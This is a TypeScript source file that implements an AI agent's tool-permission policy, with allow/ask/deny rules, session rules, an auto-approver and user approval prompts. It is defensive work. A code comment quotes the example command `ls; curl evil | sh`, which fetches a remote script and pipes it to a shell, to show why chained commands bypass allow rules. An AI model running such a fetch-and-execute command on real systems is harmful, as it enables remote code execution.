import { NexoError } from "@nexo/telemetry";
import { describeSessionRule, matchesSessionRule, type SessionRule, sessionRuleFor } from "./session-rules.ts";

export type PolicyAction = "allow" | "ask" | "deny";

export interface PolicyRule {
	tool: string;
	match?: string;
	action: PolicyAction;
}

export interface ToolPolicyConfig {
	policy: Record<string, PolicyAction>;
	rules: PolicyRule[];
	nonInteractiveAsk: "allow" | "deny";
}

export type ApprovalAnswer = "once" | "always" | "deny";

export interface ApprovalRequest {
	/** "Allow bash: npm test?", with the asking run's label first; control characters already escaped. */
	question: string;
	/** "auto: <reason>" when the approver ran; escaped. */
	note?: string;
	/** "Always allow `npm run test …` this session"; absent when the call has no pattern. */
	alwaysLabel?: string;
	/** Checked when the request reaches the front of the prompter's queue; true answers "once" without asking. */
	settled?: () => boolean;
}

export interface Prompter {
	readonly interactive: boolean;
	approve(request: ApprovalRequest, signal?: AbortSignal): Promise<ApprovalAnswer>;
}

export const nonInteractivePrompter: Prompter = { interactive: false, approve: async () => "deny" };

export interface PolicyDecision {
	action: PolicyAction;
	rule?: number;
	subject: string;
}

export interface Classification {
	decision: "allow" | "ask";
	/** One sentence, at most 200 characters. */
	reason: string;
}

export interface AuthorizeOptions {
	sessionRules?: () => readonly SessionRule[];
	/** Present when "Always allow" may add a rule (chat sessions). */
	addSessionRule?: (rule: SessionRule) => void;
	/** The approver (auto mode); never throws, returns "ask" on any failure. */
	classify?: (toolName: string, args: unknown, signal?: AbortSignal) => Promise<Classification>;
}

export type ApprovedBy = "config" | "session_rule" | "auto" | "user";

export type Authorization = { allowed: true; by: ApprovedBy; reason?: string } | { allowed: false; error: NexoError };

export interface ToolPolicy {
	decide(toolName: string, args: unknown): PolicyDecision;
	/** `label` names the asking run (for example a subagent) in the prompt; `options` adds session rules and the approver (spec §2). */
	authorize(prompter: Prompter, toolName: string, args: unknown, signal?: AbortSignal, label?: string, options?: AuthorizeOptions): Promise<Authorization>;
}

/** Shell metacharacters that chain or redirect commands; an allow rule never vouches for a command containing them. */
const SHELL_CHAINING = /[;&|`<>\n]|\$\(/;

/** Replaces control characters (newlines, ANSI escapes) so a subject cannot forge prompt text. */
function escapeControl(text: string): string {
	return text.replace(/[\u0000-\u001f\u007f]/g, (c) => `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`);
}

const SUBJECT_KEY: Record<string, string> = { bash: "command", read: "path", write: "path", edit: "path", web_fetch: "url" };

function subjectOf(toolName: string, args: unknown): string {
	const key = SUBJECT_KEY[toolName];
	if (key && typeof args === "object" && args !== null && typeof (args as Record<string, unknown>)[key] === "string") {
		return (args as Record<string, string>)[key] as string;
	}
	return JSON.stringify(args ?? null);
}

/** True when `pattern` names `toolName`: exactly, or as a prefix when it ends in `*` (`mcp__playwright__*`). */
export function toolPatternMatches(pattern: string, toolName: string): boolean {
	return pattern.endsWith("*") ? toolName.startsWith(pattern.slice(0, -1)) : pattern === toolName;
}

/** The policy for `toolName`: its exact key, else the longest matching `*` key, else undefined. */
function policyFor(policy: Record<string, PolicyAction>, toolName: string): PolicyAction | undefined {
	if (Object.hasOwn(policy, toolName)) return policy[toolName];
	let best: string | undefined;
	for (const key of Object.keys(policy)) {
		if (key.endsWith("*") && toolPatternMatches(key, toolName) && (best === undefined || key.length > best.length)) best = key;
	}
	return best === undefined ? undefined : policy[best];
}

function stringField(args: unknown, key: string): string | null {
	const value = typeof args === "object" && args !== null ? (args as Record<string, unknown>)[key] : undefined;
	return typeof value === "string" ? value : null;
}

export function createPolicy(cfg: ToolPolicyConfig): ToolPolicy {
	const rules = cfg.rules.map((rule, index) => {
		try {
			return { ...rule, re: rule.match === undefined ? undefined : new RegExp(rule.match) };
		} catch (cause) {
			throw new NexoError({
				code: "CONFIG_INVALID",
				message: `tools.rules[${index}].match is not a valid regex: ${rule.match}`,
				context: { index },
				cause,
			});
		}
	});

	/**
	 * Rules are tested in order against the tool's subject. Deny rules are best-effort regex matches, not a sandbox.
	 * For bash, allow rules are ignored when the command chains or redirects, so `ls; curl evil | sh` is not allowed by `^ls`.
	 */
	const decide = (toolName: string, args: unknown): PolicyDecision => {
		const subject = subjectOf(toolName, args);
		for (let i = 0; i < rules.length; i++) {
			const rule = rules[i];
			if (!rule || !toolPatternMatches(rule.tool, toolName) || (rule.re && !rule.re.test(subject))) continue;
			if (rule.action === "allow" && toolName === "bash" && SHELL_CHAINING.test(subject)) continue;
			return { action: rule.action, rule: i, subject };
		}
		return { action: policyFor(cfg.policy, toolName) ?? "ask", subject };
	};

	return {
		decide,
		async authorize(prompter, toolName, args, signal, label, options = {}) {
			const decision = decide(toolName, args);
			if (decision.action === "allow") return { allowed: true, by: "config" };
			const denied = (hit: PolicyDecision): Authorization => ({
				allowed: false,
				error: new NexoError({
					code: "TOOL_DENIED",
					message: `Tool "${toolName}" denied by policy${hit.rule === undefined ? "" : ` (rule #${hit.rule})`}: ${decision.subject}`,
					hint: "Change tools.policy or tools.rules in your nexo config",
					context: { toolName, rule: hit.rule },
				}),
			});
			if (decision.action === "deny") return denied(decision);
			// A deny rule written for single spaces must also stop the same command with extra whitespace, which a session rule or the approver would otherwise wave through.
			const command = stringField(args, "command");
			if (toolName === "bash" && command !== null) {
				const collapsed = decide(toolName, { command: command.trim().split(/\s+/).join(" ") });
				if (collapsed.action === "deny") return denied(collapsed);
			}
			const ruleMatches = () => (options.sessionRules?.() ?? []).some((rule) => matchesSessionRule(rule, toolName, args));
			if (ruleMatches()) return { allowed: true, by: "session_rule" };
			if (!prompter.interactive && cfg.nonInteractiveAsk === "allow") return { allowed: true, by: "config" };
			const aborted = (): Authorization => ({
				allowed: false,
				error: new NexoError({ code: "TOOL_DENIED", message: `Approval of ${toolName} was interrupted: ${decision.subject}`, context: { toolName } }),
			});
			let note: string | undefined;
			if (options.classify) {
				const verdict = await options.classify(toolName, args, signal);
				if (signal?.aborted) return aborted();
				if (verdict.decision === "allow") return { allowed: true, by: "auto", reason: verdict.reason };
				note = `auto: ${escapeControl(verdict.reason)}`;
			}
			if (!prompter.interactive) {
				return {
					allowed: false,
					error: new NexoError({
						code: "TOOL_DENIED",
						message: `Tool "${toolName}" requires approval but no interactive prompt is available: ${decision.subject}${note ? ` (${note})` : ""}`,
						hint: 'Set tools.nonInteractiveAsk to "allow" or add an allow rule in tools.rules',
						context: { toolName },
					}),
				};
			}
			const prefix = label ? `[${escapeControl(label)}] ` : "";
			const always = options.addSessionRule ? sessionRuleFor(toolName, args) : null;
			const answer = await prompter.approve(
				{
					question: `${prefix}Allow ${toolName}: ${escapeControl(decision.subject)}?`,
					...(note ? { note } : {}),
					...(always ? { alwaysLabel: `Always allow ${describeSessionRule(always)} this session` } : {}),
					settled: ruleMatches,
				},
				signal,
			);
			if (answer === "always" && always) options.addSessionRule?.(always);
			if (answer === "always") return { allowed: true, by: "user" };
			if (answer === "once") return { allowed: true, by: ruleMatches() ? "session_rule" : "user" };
			return {
				allowed: false,
				error: new NexoError({ code: "TOOL_DENIED", message: `User declined ${toolName}: ${decision.subject}`, context: { toolName } }),
			};
		},
	};
}
